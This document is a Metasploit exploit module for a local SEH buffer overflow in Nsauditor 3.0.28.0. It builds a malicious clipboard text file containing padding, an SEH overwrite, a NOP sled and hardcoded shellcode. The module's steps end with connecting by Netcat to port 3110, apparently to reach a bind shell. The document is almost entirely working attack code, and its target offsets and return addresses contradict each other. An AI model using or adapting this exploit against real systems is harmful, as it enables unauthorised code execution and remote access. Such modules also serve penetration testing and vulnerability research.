##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'Nsauditor 3.0.28.0 - Local SEH Buffer Overflow',
      'Description'  => %q{
          This module exploits a stack based buffer overflow in Nsauditor 3.0.28.0, when
          1.- Run python code : Nsauditor.py
        2.- Open EVIL.txt and copy content to clipboard
        3.- Open Nsauditor
        4.- In the Window select 'Tools' > 'Dns Lookup'
        5.- Paste the content of EVIL.txt into the Field: 'Dns Query'
        6.- Click 'Resolve'
        7.- Connect with Netcat on port 3110
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'Achilles',            # Original discovery
          'acorn421(at)gmail.com',       # MSF module
        ],
      'References'  =>
        [
          [ 'OSVDB', '' ],
          [ 'EBD', '45744' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Platform'  => 'win',
      'Payload'   =>
        {
          'BadChars'    => "\x00\x0a\x0d\x2e",
          'DisableNops' => true,
          'Space'       => 10000
        },
      'Targets'   =>
        [
          [ 'Nsauditor 3.0.28.0',
            {
              'Ret'     =>  0x72d12f35, # 0x72d12f35 : P/P/R FROM msacm32.drv form winxp sp3
              'Offset'  =>  900
            }
          ],
        ],
      'Privileged'  => false,
      'DisclosureDate'  => 'Dec 25 2018',
      'DefaultTarget'  => 0))

    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.txt']),], self.class)

  end

  def exploit
    buffer = "\x41" * 5235
    nseh = ""
    nseh << "\xeb\x06\x90\x90" #jmp short 6 
    seh = ""
    seh << "\x30\xFF\xE6\x01" #nsnetutils.dll
    nops = "\x90" * 20

    buf =  ""
    buf << "\xd9\xc7\xb8\x8e\xe7\x77\xf1\xd9\x74\x24\xf4\x5b\x29"
    buf << "\xc9\xb1\x53\x83\xeb\xfc\x31\x43\x13\x03\xcd\xf4\x95"
    buf << "\x04\x2d\x12\xdb\xe7\xcd\xe3\xbc\x6e\x28\xd2\xfc\x15"
    buf << "\x39\x45\xcd\x5e\x6f\x6a\xa6\x33\x9b\xf9\xca\x9b\xac"
    buf << "\x4a\x60\xfa\x83\x4b\xd9\x3e\x82\xcf\x20\x13\x64\xf1"
    buf << "\xea\x66\x65\x36\x16\x8a\x37\xef\x5c\x39\xa7\x84\x29"
    buf << "\x82\x4c\xd6\xbc\x82\xb1\xaf\xbf\xa3\x64\xbb\x99\x63"
    buf << "\x87\x68\x92\x2d\x9f\x6d\x9f\xe4\x14\x45\x6b\xf7\xfc"
    buf << "\x97\x94\x54\xc1\x17\x67\xa4\x06\x9f\x98\xd3\x7e\xe3"
    buf << "\x25\xe4\x45\x99\xf1\x61\x5d\x39\x71\xd1\xb9\xbb\x56"
    buf << "\x84\x4a\xb7\x13\xc2\x14\xd4\xa2\x07\x2f\xe0\x2f\xa6"
    buf << "\xff\x60\x6b\x8d\xdb\x29\x2f\xac\x7a\x94\x9e\xd1\x9c"
    buf << "\x77\x7e\x74\xd7\x9a\x6b\x05\xba\xf2\x58\x24\x44\x03"
    buf << "\xf7\x3f\x37\x31\x58\x94\xdf\x79\x11\x32\x18\x7d\x08"
    buf << "\x82\xb6\x80\xb3\xf3\x9f\x46\xe7\xa3\xb7\x6f\x88\x2f"
    buf << "\x47\x8f\x5d\xc5\x4f\x36\x0e\xf8\xb2\x88\xfe\xbc\x1c"
    buf << "\x61\x15\x33\x43\x91\x16\x99\xec\x3a\xeb\x22\x1e\x9d"
    buf << "\x62\xc4\x74\xf1\x22\x5e\xe0\x33\x11\x57\x97\x4c\x73"
    buf << "\xcf\x3f\x04\x95\xc8\x40\x95\xb3\x7e\xd6\x1e\xd0\xba"
    buf << "\xc7\x20\xfd\xea\x90\xb7\x8b\x7a\xd3\x26\x8b\x56\x83"
    buf << "\xcb\x1e\x3d\x53\x85\x02\xea\x04\xc2\xf5\xe3\xc0\xfe"
    buf << "\xac\x5d\xf6\x02\x28\xa5\xb2\xd8\x89\x28\x3b\xac\xb6"
    buf << "\x0e\x2b\x68\x36\x0b\x1f\x24\x61\xc5\xc9\x82\xdb\xa7"
    buf << "\xa3\x5c\xb7\x61\x23\x18\xfb\xb1\x35\x25\xd6\x47\xd9"
    buf << "\x94\x8f\x11\xe6\x19\x58\x96\x9f\x47\xf8\x59\x4a\xcc"
    buf << "\x08\x10\xd6\x65\x81\xfd\x83\x37\xcc\xfd\x7e\x7b\xe9"
    buf << "\x7d\x8a\x04\x0e\x9d\xff\x01\x4a\x19\xec\x7b\xc3\xcc"
    buf << "\x12\x2f\xe4\xc4"
    
    payload = ""
    payload << buffer << nseh << seh << nops << buf

    # buf = "\x90"*(target['Offset'])
    # buf << "\xeb\x06#{Rex::Text.rand_text_alpha(2, payload_badchars)}" # nseh (jmp to payload)
    # buf << [target.ret] .pack('V')  # seh
    # buf << make_nops(10)
    # buf << payload.encoded
    # buf << "\x90" * 200

    file_create(payload)
    handler
    
  end
end
            